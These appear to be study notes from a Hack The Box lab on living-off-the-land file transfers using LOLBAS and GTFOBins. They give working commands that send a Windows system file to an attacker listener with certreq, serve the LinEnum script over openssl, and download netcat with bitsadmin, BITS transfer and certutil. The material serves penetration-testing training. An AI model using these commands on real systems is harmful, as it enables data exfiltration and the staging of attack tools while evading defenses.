## Using the LOLBAS and GTFOBins Project

### LOLBAS
![[Pasted image 20260501124401.png]]
Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.
#### Upload win.ini to our Pwnbox

```powershell
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
#### File Received in our Netcat Session

```shell
3kjS@htb[/htb]$ sudo nc -lvnp 8000
```

### GTFOBins
![[Pasted image 20260501124725.png]]
#### Create Certificate in our Pwnbox

```shell
3kjS@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
#### Stand up the Server in our Pwnbox

```shell
3kjS@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
#### Download File from the Compromised Machine

```shell
3kjS@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
## Other Common Living off the Land tools
#### File Download with Bitsadmin

```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground 
http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
#### Download

```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
### Certutil
#### Download a File with Certutil

```powershell
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

